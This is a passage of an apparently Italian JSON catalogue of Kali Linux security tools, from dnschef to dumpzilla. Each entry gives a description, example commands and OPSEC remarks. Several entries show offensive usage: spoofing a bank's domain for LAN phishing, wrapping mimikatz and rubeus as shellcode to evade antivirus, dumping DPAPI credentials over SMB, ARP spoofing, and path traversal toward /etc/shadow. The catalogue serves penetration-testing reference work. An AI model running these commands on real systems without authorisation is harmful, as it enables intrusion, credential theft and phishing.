    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DNSChef è un proxy DNS altamente configurabile per penetration tester. Può essere configurato per spooffare risposte DNS specifiche, redirigendo il traffico delle vittime verso l'attaccante. Supporta tutti i tipi di record (A, AAAA, MX, TXT, ecc.) e può operare in modalità full-fake (tutto spoof) o selettiva (solo alcuni domini).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Selective Spoofing:</strong> Spoofa solo domini specifici, inoltrando gli altri normalmente.</p><p><strong>All Record Types:</strong> Supporta A, AAAA, MX, NS, CNAME, TXT e altri record.</p><p><strong>Wildcard Support:</strong> Pattern matching per spooffare intere zone.</p><p><strong>Upstream DNS:</strong> Inoltra query legittime a un DNS upstream configurato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spoof singolo dominio\ndnschef --fakeip 192.168.1.100 --fakedomains target.com\n\n# Spoof tutto verso attacker\ndnschef --fakeip 192.168.1.100\n\n# Da file di configurazione\ndnschef --file dns_config.ini</code></pre><p>Richiede che le vittime usino il proxy come DNS (via DHCP spoof o MITM).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>MITM attacks</strong>, redirige traffico verso server malevoli. Per <strong>Phishing</strong> in LAN, spoofa il dominio della banca verso clone locale. In <strong>Malware Analysis</strong>, redirige C2 verso sinkhole per analisi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Prerequisiti:</strong> Le vittime devono usare il DNS dell'attaccante. Richiede ARP spoof o rogue DHCP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "dnsenum",
    "name": "dnsenum",
    "version": "1.3.2",
    "icon": "../app/icons/dnsenum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsenum/",
    "desc": "Enumerazione DNS: zone transfer, brute force subdomain, reverse lookup.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DNSenum è uno script Perl per la raccolta completa di informazioni DNS su un dominio. Esegue automaticamente zone transfer (AXFR), brute force di sottodomini con wordlist, reverse lookup sui netblock trovati e cerca informazioni aggiuntive su Google. È uno dei tool classici per la reconnaissance DNS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Transfer:</strong> Tenta AXFR su tutti i nameserver del dominio.</p><p><strong>Subdomain Brute Force:</strong> Testa sottodomini da wordlist configurabile.</p><p><strong>Reverse Lookup:</strong> Risolve inversamente i netblock trovati per scoprire altri host.</p><p><strong>Google Scraping:</strong> Cerca sottodomini indicizzati da Google.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione completa\ndnsenum target.com\n\n# Con wordlist custom\ndnsenum --enum -f subdomains.txt target.com\n\n# Thread multipli\ndnsenum --threads 10 target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Reconnaissance</strong>, è un buon punto di partenza per DNS enum. Zone transfer quando funziona rivela l'intera zona. Per <strong>Learning</strong>, mostra le tecniche classiche di DNS enumeration.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> Tool più moderni (Amass, subfinder) sono più efficaci. Zone transfer raramente funziona su target reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsgen",
    "name": "dnsgen",
    "version": "1.0.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsgen/",
    "desc": "Genera permutazioni di subdomain da wordlist esistenti per discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DNSgen è un tool Python che genera permutazioni di subdomain partendo da una lista esistente di domini. Applica pattern intelligenti come aggiunta di numeri, parole comuni, swap di caratteri e combinazioni per scoprire subdomain non ancora enumerati. Integrato nella pipeline con massdns per risoluzione veloce.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Permutation Engine:</strong> Genera varianti basate su pattern comuni (dev, staging, prod, numeri).</p><p><strong>Word Extraction:</strong> Estrae parole dai subdomain esistenti per creare nuove combinazioni.</p><p><strong>Pipeline Ready:</strong> Output compatibile con massdns, dnsx e altri resolver.</p><p><strong>Custom Wordlist:</strong> Supporta wordlist aggiuntive per permutazioni specifiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera permutazioni da lista esistente\ncat subdomains.txt | dnsgen - > permutations.txt\n\n# Con wordlist custom\ncat subdomains.txt | dnsgen -w words.txt -\n\n# Pipeline completa con massdns\ncat subs.txt | dnsgen - | massdns -r resolvers.txt -o S</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Discovery</strong>, amplifica i risultati di subfinder/amass con permutazioni intelligenti. Nel <strong>Bug Bounty</strong>, trova subdomain nascosti che altri hunter hanno mancato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Volume:</strong> Genera migliaia di query DNS, usa resolver distribuiti per evitare rate limiting.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsmap",
    "name": "dnsmap",
    "version": "0.36",
    "icon": "../app/icons/dnsmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsmap/",
    "desc": "Brute force subdomain con wordlist per enumerare host nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DNSmap è un tool per subdomain brute forcing che testa sistematicamente nomi di subdomain da wordlist contro un dominio target. Semplice ma efficace, è stato uno dei primi tool per questa tecnica. Supporta output in formato CSV e log dettagliati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Wordlist Brute Force:</strong> Testa ogni entry della wordlist come subdomain.</p><p><strong>Built-in Wordlist:</strong> Include una wordlist di default con subdomain comuni.</p><p><strong>Delay Configurable:</strong> Imposta delay tra query per evitare detection.</p><p><strong>Output Formats:</strong> Salva risultati in formato CSV per analisi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan con wordlist di default\ndnsmap target.com\n\n# Con wordlist custom\ndnsmap target.com -w subdomains.txt\n\n# Con delay tra query\ndnsmap target.com -d 100\n\n# Salva in CSV\ndnsmap target.com -c -r results/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Basic Enumeration</strong>, punto di partenza semplice per subdomain discovery. Tool classico per <strong>Learning</strong> le tecniche di DNS enumeration.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> Tool moderni come subfinder, amass sono più efficaci. Query DNS facilmente loggabili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnsrecon",
    "name": "dnsrecon",
    "version": "1.2.0",
    "icon": "../app/icons/dnsrecon-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnsrecon/",
    "desc": "Ricognizione DNS completa: zone transfer, cache snoop, brute force, DNSSEC.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DNSrecon è uno degli script di ricognizione DNS più completi disponibili. Scritto in Python, combina multiple tecniche: zone transfer, brute force, reverse lookup, cache snooping, enumerazione DNSSEC e lookup di record SPF/SOA/MX. Output in formati multipli per integrazione con altri tool.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Transfer:</strong> Tenta AXFR su tutti i nameserver individuati.</p><p><strong>Cache Snooping:</strong> Verifica se il DNS ha in cache specifici record.</p><p><strong>DNSSEC Enum:</strong> Enumera zone DNSSEC usando NSEC walking.</p><p><strong>Brute Force:</strong> Subdomain discovery con wordlist e thread multipli.</p><p><strong>Google Enum:</strong> Cerca subdomain via Google dorking.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione standard\ndnsrecon -d target.com\n\n# Zone transfer\ndnsrecon -d target.com -t axfr\n\n# Brute force con wordlist\ndnsrecon -d target.com -t brt -D subdomains.txt\n\n# DNSSEC zone walking\ndnsrecon -d target.com -t zonewalk\n\n# Output JSON\ndnsrecon -d target.com -j output.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Reconnaissance</strong>, è il tool go-to per DNS enumeration completa. Per <strong>DNSSEC Analysis</strong>, zone walking su domini mal configurati. Tool essenziale per <strong>Pentest</strong> su infrastrutture on-premise.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Query multiple sono facilmente loggabili. Zone transfer tentativi vengono quasi sempre loggati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnstracer",
    "name": "dnstracer",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnstracer/",
    "desc": "Traccia la catena di risoluzione DNS dai root server al target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DNStracer traccia la catena di delega DNS partendo dai root server fino al nameserver autoritativo per un dominio. Mostra ogni hop nella risoluzione, identificando nameserver intermedi e potenziali problemi di configurazione. Utile per debugging DNS e analisi dell'infrastruttura.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Delegation Tracing:</strong> Segue la catena completa di delega DNS.</p><p><strong>Root Server Start:</strong> Inizia dai root server per traccia completa.</p><p><strong>Query Analysis:</strong> Mostra ogni query e risposta nella catena.</p><p><strong>Verbose Output:</strong> Dettagli su TTL, glue record e referral.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Traccia base\ndnstracer target.com\n\n# Query specifico record type\ndnstracer -q MX target.com\n\n# Verbose con retry\ndnstracer -v -r 3 target.com\n\n# Specifica root server\ndnstracer -s a.root-servers.net target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DNS Debugging</strong>, identifica dove fallisce la risoluzione. Nell'<strong>Infrastructure Analysis</strong>, mappa la catena di delega e nameserver utilizzati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Query DNS standard, basso profilo. Utile per capire l'infrastruttura target senza attività invasiva.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dnstwist",
    "name": "dnstwist",
    "version": "0~20250130",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnstwist/",
    "desc": "Trova domini typosquatting e phishing simili al tuo brand.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DNStwist è un tool per individuare domini di typosquatting, phishing e brand impersonation. Genera permutazioni del dominio target (typo, homoglyph, bitsquatting, insertion, omission) e verifica quali sono registrati. Essenziale per brand protection e threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fuzzing Algorithms:</strong> Genera permutazioni con 15+ algoritmi diversi.</p><p><strong>Homoglyph Detection:</strong> Trova domini con caratteri Unicode visivamente simili.</p><p><strong>WHOIS/MX/NS:</strong> Raccoglie info su domini registrati trovati.</p><p><strong>Screenshot:</strong> Cattura screenshot dei siti sospetti trovati.</p><p><strong>GeoIP:</strong> Identifica la location dei server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\ndnstwist example.com\n\n# Con screenshot e output JSON\ndnstwist --screenshots shots/ -f json example.com\n\n# Include WHOIS e MX\ndnstwist --whois --mxcheck example.com\n\n# Solo domini registrati\ndnstwist --registered example.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Brand Protection</strong>, identifica domini di phishing che imitano il tuo brand. Nella <strong>Threat Intelligence</strong>, traccia campagne di typosquatting. Per <strong>Blue Team</strong>, crea watchlist di domini sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Difensivo:</strong> Tool primariamente difensivo per protezione brand. Query DNS e WHOIS sono normali attività.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "dnswalk",
    "name": "dnswalk",
    "version": "2.0.2.dfsg.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dnswalk/",
    "desc": "Debugger DNS che verifica configurazioni di zona e problemi comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DNSwalk è un debugger DNS che esegue zone transfer e verifica la configurazione per problemi comuni. Controlla record orfani, PTR mancanti, CNAME loops, delegation inconsistencies e altri errori di configurazione DNS. Utile per audit di zone DNS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zone Analysis:</strong> Analizza zone complete per errori di configurazione.</p><p><strong>PTR Checking:</strong> Verifica consistenza tra record A e PTR.</p><p><strong>Delegation Check:</strong> Controlla che le deleghe siano corrette.</p><p><strong>CNAME Validation:</strong> Individua CNAME chain e loop.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Check zona (nota: trailing dot)\ndnswalk target.com.\n\n# Debug verbose\ndnswalk -d target.com.\n\n# Forza zone transfer\ndnswalk -r target.com.\n\n# Check ricorsivo subzone\ndnswalk -a target.com.</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DNS Auditing</strong>, verifica configurazioni prima di attacchi. Nella <strong>Reconnaissance</strong>, identifica misconfiguration sfruttabili. Tool utile per <strong>Blue Team</strong> che verificano la propria infrastruttura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Prerequisito:</strong> Richiede zone transfer abilitato, raro su target moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "donut-shellcode",
    "name": "donut-shellcode",
    "version": "1.1",
    "icon": "../app/icons/donut-shellcode-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/donut-shellcode/",
    "desc": "Converte .NET, PE, VBS in shellcode position-independent per injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Donut è un generatore di shellcode position-independent che converte assembly .NET, eseguibili PE, VBScript e JScript in shellcode iniettabile. Il payload risultante carica ed esegue in memoria senza toccare disco. Essenziale per evasion e payload delivery in red team operations.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>.NET Support:</strong> Converte qualsiasi assembly .NET in shellcode.</p><p><strong>PE Conversion:</strong> Supporta EXE e DLL native.</p><p><strong>Encryption:</strong> Cifra payload con Chaskey block cipher.</p><p><strong>AMSI/WLDP Bypass:</strong> Include bypass per protezioni Microsoft.</p><p><strong>Compression:</strong> Comprime payload per ridurre dimensioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti .NET assembly\ndonut -f mimikatz.exe -o payload.bin\n\n# Con encryption e compression\ndonut -f payload.exe -o shell.bin -e 3 -z 2\n\n# Specifica entry point per DLL\ndonut -f evil.dll -m DllMain -o shell.bin\n\n# Parametri per l'eseguibile\ndonut -f rubeus.exe -p \"kerberoast\" -o rubeus.bin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, converte tool come Mimikatz in shellcode per injection. Nel <strong>Payload Development</strong>, crea payload per loader custom. Essenziale per <strong>AV Evasion</strong> caricando in memoria.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature:</strong> Donut shellcode ha signature conosciute. Considera encoding aggiuntivo o loader custom.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "dotdotpwn",
    "name": "dotdotpwn",
    "version": "3.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dotdotpwn/",
    "desc": "Fuzzer per directory traversal su HTTP, FTP, TFTP, payload multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DotDotPwn è un fuzzer specifico per vulnerabilità di directory traversal (path traversal). Testa automaticamente centinaia di payload su diversi protocolli (HTTP, FTP, TFTP, payload-based) cercando di accedere a file sensibili come /etc/passwd. Include encoding multipli per bypass di filtri.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Protocol:</strong> Supporta HTTP, HTTPS, FTP, TFTP.</p><p><strong>Encoding Bypass:</strong> URL encoding, double encoding, unicode, null byte.</p><p><strong>Depth Control:</strong> Configura profondità massima di traversal.</p><p><strong>Custom Payloads:</strong> Definisci file target e payload custom.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test HTTP\ndotdotpwn -m http -h target.com\n\n# FTP con profondità specifica\ndotdotpwn -m ftp -h target.com -d 8\n\n# HTTP con URL custom\ndotdotpwn -m http-url -u 'http://target/page.php?file=TRAVERSAL'\n\n# Con file target specifico\ndotdotpwn -m http -h target.com -f /etc/shadow</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>LFI Testing</strong>, automatizza discovery di path traversal. Nel <strong>Web Pentesting</strong>, testa rapidamente parametri vulnerabili. Utile per <strong>CTF</strong> su challenge web.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Genera centinaia di request anomale, facilmente rilevabile da WAF/IDS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "dploot",
    "name": "dploot",
    "version": "3.1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dploot/",
    "desc": "Estrae credenziali DPAPI da Windows: browser passwords, WiFi, certificates.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DPloot è un tool Python per l'estrazione remota di credenziali protette da DPAPI su Windows. Recupera password dei browser (Chrome, Edge, Firefox), credenziali WiFi, certificati e vault credentials. Opera via SMB senza necessità di esecuzione sulla macchina target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Browser Credentials:</strong> Estrae password salvate da Chrome, Edge, Firefox.</p><p><strong>DPAPI Masterkey:</strong> Recupera e decripta DPAPI master key.</p><p><strong>WiFi Passwords:</strong> Estrae credenziali WiFi salvate.</p><p><strong>Certificate Extraction:</strong> Recupera certificati e chiavi private.</p><p><strong>Remote Operation:</strong> Opera via SMB senza agente sul target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump browser credentials\ndploot browser -u admin -p password -d domain.local target\n\n# Estrai WiFi passwords\ndploot wifi -u admin -p password target\n\n# Dump certificates\ndploot certificates -u admin -p password target\n\n# Con hash NTLM\ndploot browser -u admin -H NTLMHASH target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Post-Exploitation</strong>, estrai credenziali per lateral movement. Per <strong>Privilege Escalation</strong>, trova password riutilizzate. Essenziale in <strong>AD Pentesting</strong> per raccolta credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>SMB Access:</strong> Richiede accesso admin al target. Accessi SMB a profili utente possono essere rilevati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "driftnet",
    "name": "driftnet",
    "version": "1.5.0",
    "icon": "../app/icons/driftnet-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/driftnet/",
    "desc": "Cattura immagini e media dal traffico di rete in tempo reale.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Driftnet è uno sniffer specializzato che estrae immagini e contenuti multimediali dal traffico di rete. Cattura JPEG, GIF, PNG e stream audio MPEG dal traffico HTTP non cifrato. Visualizza le immagini in tempo reale in una finestra grafica o le salva su disco.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Image Extraction:</strong> Cattura JPEG, GIF, PNG dal traffico.</p><p><strong>Audio Capture:</strong> Estrae stream audio MPEG.</p><p><strong>Live Display:</strong> Mostra immagini in tempo reale in GUI.</p><p><strong>Adjunct Mode:</strong> Lavora con output di altri sniffer.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura su interfaccia\ndriftnet -i eth0\n\n# Salva immagini in directory\ndriftnet -i eth0 -d captured_images/\n\n# Solo cattura, no display\ndriftnet -i eth0 -a -d images/\n\n# Da file pcap\ndriftnet -f capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Analysis</strong>, visualizza traffico HTTP intercettato. Nel <strong>MITM</strong>, mostra cosa vede la vittima. Demo visiva per <strong>Awareness</strong> sulla sicurezza del traffico non cifrato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazione:</strong> Inefficace su HTTPS. Richiede posizione MITM o accesso al traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "dscan",
    "name": "dscan",
    "version": "0.1.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dscan/",
    "desc": "Scanner distribuito per ricognizione su larga scala con worker multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DScan è uno scanner di rete distribuito progettato per ricognizione su larga scala. Supporta architettura master/worker per distribuire il carico di scansione su macchine multiple. Integra Nmap per il lavoro effettivo di scanning con coordinamento centralizzato dei risultati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Distributed Architecture:</strong> Master coordina worker multipli.</p><p><strong>Nmap Backend:</strong> Usa Nmap per le scansioni effettive.</p><p><strong>Result Aggregation:</strong> Raccoglie e unifica risultati da tutti i worker.</p><p><strong>Task Distribution:</strong> Divide target range tra worker automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia master\ndscan master -p 8080\n\n# Avvia worker\ndscan worker -m master:8080\n\n# Avvia scan\ndscan scan -t targets.txt --ports 1-1000\n\n# Con options nmap\ndscan scan -t 192.168.0.0/16 --nmap-opts \"-sV\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Large Scale Recon</strong>, scansiona grandi range IP distribuendo il carico. In <strong>Red Team</strong>, accelera la fase di discovery usando infrastruttura distribuita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Scansioni distribuite da IP multipli possono essere correlate. Considera source rotation.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "dsniff",
    "name": "dsniff",
    "version": "2.4b1",
    "icon": "../app/icons/dsniff-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dsniff/",
    "desc": "Suite di tool per sniffing password e MITM: arpspoof, macof, urlsnarf.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dsniff è una suite storica di tool per network auditing e penetration testing. Include sniffer per password in chiaro, tool per attacchi MITM, e utility per intercettazione traffico. Comprende arpspoof, dnsspoof, macof, filesnarf, urlsnarf, webspy e altri tool essenziali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>arpspoof:</strong> ARP spoofing per MITM attacks.</p><p><strong>dnsspoof:</strong> DNS spoofing per redirect traffico.</p><p><strong>macof:</strong> MAC flooding per overflow CAM table switch.</p><p><strong>urlsnarf:</strong> Cattura URL HTTP dal traffico.</p><p><strong>filesnarf:</strong> Estrae file da sessioni NFS.</p><p><strong>dsniff:</strong> Sniffer per password in protocolli comuni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># ARP spoofing MITM\narpspoof -i eth0 -t victim gateway\n\n# MAC flooding\nmacof -i eth0\n\n# Sniff URL\nurlsnarf -i eth0\n\n# DNS spoofing\ndnsspoof -i eth0 -f hosts.txt\n\n# Password sniffing\ndsniff -i eth0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MITM Attacks</strong>, arpspoof è ancora il tool go-to. Nel <strong>Network Pentesting</strong>, macof testa sicurezza switch. Per <strong>Learning</strong>, dimostra vulnerabilità dei protocolli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> ARP spoofing facilmente rilevabile da IDS. MAC flooding causa instabilità visibile. Tool datato ma ancora efficace su reti legacy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "dufflebag",
    "name": "dufflebag",
    "version": "0.0~git20200205.9a01942",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dufflebag/",
    "desc": "Cerca secret e credenziali in snapshot EBS pubblici di AWS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dufflebag è un tool per cercare credenziali e secret esposti in snapshot EBS pubblici di AWS. Monta automaticamente gli snapshot, cerca pattern di credenziali (API key, password, certificati) e report i finding. Sfrutta il fatto che molti snapshot EBS vengono resi pubblici per errore.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>EBS Mounting:</strong> Monta automaticamente snapshot EBS pubblici.</p><p><strong>Secret Detection:</strong> Cerca API key, password, certificati, chiavi SSH.</p><p><strong>Pattern Matching:</strong> Usa regex configurabili per trovare credenziali.</p><p><strong>Region Scanning:</strong> Scansiona snapshot in tutte le regioni AWS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca snapshot pubblici\ndufflebag search\n\n# Scansiona snapshot specifico\ndufflebag scan snap-1234567890\n\n# Specifica regione\ndufflebag search --region us-west-2\n\n# Con pattern custom\ndufflebag scan snap-xxx --patterns patterns.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Cloud Security</strong>, trova dati esposti in snapshot pubblici. Nella <strong>Bug Bounty</strong>, scopri credenziali AWS leak. Per <strong>Blue Team</strong>, verifica che i tuoi snapshot non siano pubblici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>AWS Costs:</strong> Montare snapshot comporta costi. Richiede credenziali AWS proprie per operare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "dumpsterdiver",
    "name": "dumpsterdiver",
    "version": "0~git20200911",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dumpsterdiver/",
    "desc": "Cerca secret, API key e credenziali hardcoded in repository e file.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DumpsterDiver è un tool per trovare secret e credenziali hardcoded in file e repository. Cerca API key, password, token OAuth, chiavi private e altri secret usando entropy analysis e pattern matching. Supporta ricerca ricorsiva in directory, archivi compressi e repository Git.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Entropy Analysis:</strong> Identifica stringhe ad alta entropia (possibili secret).</p><p><strong>Pattern Matching:</strong> Cerca pattern noti di API key e credenziali.</p><p><strong>Archive Support:</strong> Analizza ZIP, TAR, GZ automaticamente.</p><p><strong>Git History:</strong> Cerca secret anche nella history del repository.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansiona directory\npython3 DumpsterDiver.py -p /path/to/scan\n\n# Con entropy threshold custom\npython3 DumpsterDiver.py -p ./repo -e 4.5\n\n# Cerca pattern specifici\npython3 DumpsterDiver.py -p ./code --grep 'api_key|secret'\n\n# Output JSON\npython3 DumpsterDiver.py -p ./repo -o results.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Code Review</strong>, verifica assenza di credenziali hardcoded. Nel <strong>Bug Bounty</strong>, cerca secret in repository pubblici. Per <strong>DevSecOps</strong>, integra in CI/CD pipeline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False Positives:</strong> Entropy analysis genera falsi positivi. Richiede review manuale dei risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "dumpzilla",
    "name": "dumpzilla",
    "version": "20210311",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/dumpzilla/",
    "desc": "Estrae cronologia, password, cookie e download dai profili Firefox.",
